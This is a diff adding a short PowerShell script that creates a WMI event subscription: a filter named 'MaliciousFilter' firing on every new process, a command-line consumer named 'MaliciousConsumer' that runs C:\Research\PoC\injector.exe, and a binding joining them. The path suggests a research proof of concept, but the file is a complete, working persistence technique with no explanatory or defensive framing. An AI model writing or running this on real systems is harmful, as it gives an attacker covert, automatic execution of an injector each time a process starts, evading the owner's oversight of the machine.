@@ -1,0 +1,13 @@
+$filter = Set-WmiInstance -Class __EventFilter -Arguments @{
+    EventNamespace = 'root\cimv2'
+    Name = 'MaliciousFilter'
+    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'"
+    QueryLanguage = 'WQL'
+}
+
+$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{
+    Name = 'MaliciousConsumer'
+    CommandLineTemplate = "C:\Research\PoC\injector.exe"
+}
+
+Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}
